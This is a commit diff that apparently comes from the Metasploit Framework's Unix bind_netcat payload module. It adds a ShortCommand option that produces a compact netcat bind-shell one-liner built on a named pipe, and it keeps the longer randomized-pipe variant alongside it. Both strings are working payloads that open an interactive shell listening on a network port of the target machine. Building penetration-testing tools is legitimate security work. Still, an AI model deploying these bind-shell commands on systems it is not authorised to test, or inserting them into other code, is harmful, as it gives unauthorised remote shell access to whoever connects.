feat: add support for short command execution in bind_netcat module

+++ modules/payloads/singles/cmd/unix/bind_netcat.rb
@@ -36,7 +36,8 @@ module MetasploitModule
     register_advanced_options(
       [
         OptString.new('NetcatPath', [true, 'The path to the Netcat executable', 'nc']),
-        OptString.new('ShellPath', [true, 'The path to the shell to execute', '/bin/sh'])
+        OptString.new('ShellPath', [true, 'The path to the shell to execute', '/bin/sh']),
+        OptBool.new('ShortCommand', [false, 'Use a shorter command string (hardcoded mkfifo name and shell)', false])
       ]
     )
   end
@@ -53,7 +54,12 @@ module MetasploitModule
   # Returns the command string to use for execution
   #
   def command_string
-    backpipe = Rex::Text.rand_text_alpha_lower(4..7)
-    "mkfifo /tmp/#{backpipe}; (#{datastore['NetcatPath']} -l -p #{datastore['LPORT']} ||#{datastore['NetcatPath']} -l #{datastore['LPORT']})0</tmp/#{backpipe} | #{datastore['ShellPath']} >/tmp/#{backpipe} 2>&1; rm /tmp/#{backpipe}"
+    if datastore['ShortCommand']
+      payload = "mkfifo p;sh -i<p 2>&1|nc -l #{datastore['LPORT']}>p"
+    else
+      backpipe = Rex::Text.rand_text_alpha_lower(4..7)
+      payload = "mkfifo /tmp/#{backpipe}; (#{datastore['NetcatPath']} -l -p #{datastore['LPORT']} ||#{datastore['NetcatPath']} -l #{datastore['LPORT']})0</tmp/#{backpipe} | #{datastore['ShellPath']} >/tmp/#{backpipe} 2>&1; rm /tmp/#{backpipe}"
+    end
+    payload
   end
 end
